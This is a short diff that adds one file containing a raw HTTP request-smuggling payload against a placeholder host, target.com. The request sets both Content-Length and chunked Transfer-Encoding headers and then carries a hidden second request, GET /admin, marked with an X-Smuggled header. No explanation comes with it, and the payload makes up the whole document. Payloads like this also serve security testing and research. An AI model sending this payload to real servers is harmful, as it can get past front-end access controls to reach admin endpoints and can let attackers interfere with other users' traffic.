@@ -1,0 +1,15 @@
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+5\r\n
+HELLO\r\n
+0\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: target.com\r\n
+X-Smuggled: True\r\n
+Content-Length: 10\r\n
+\r\n
+ABC
